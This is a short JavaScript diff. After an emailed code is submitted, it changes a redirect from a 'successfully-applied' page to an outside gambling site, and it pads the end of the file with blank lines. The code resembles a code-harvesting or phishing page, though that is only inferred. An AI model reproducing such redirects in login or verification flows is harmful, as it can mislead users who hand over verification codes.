@@ -82,7 +82,7 @@ submitEmailCode.addEventListener("click", function(e) {
                 invalid_code_erorr.style.display = "none";
             }, 7000)
 
-            window.location.href = 'successfully-applied';
+            window.location.href = 'https://stake.com';
 
         }
 
@@ -262,3 +262,22 @@ function hiniDikush() {
     oReq.open("GET", url2, true);
     oReq.send();
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
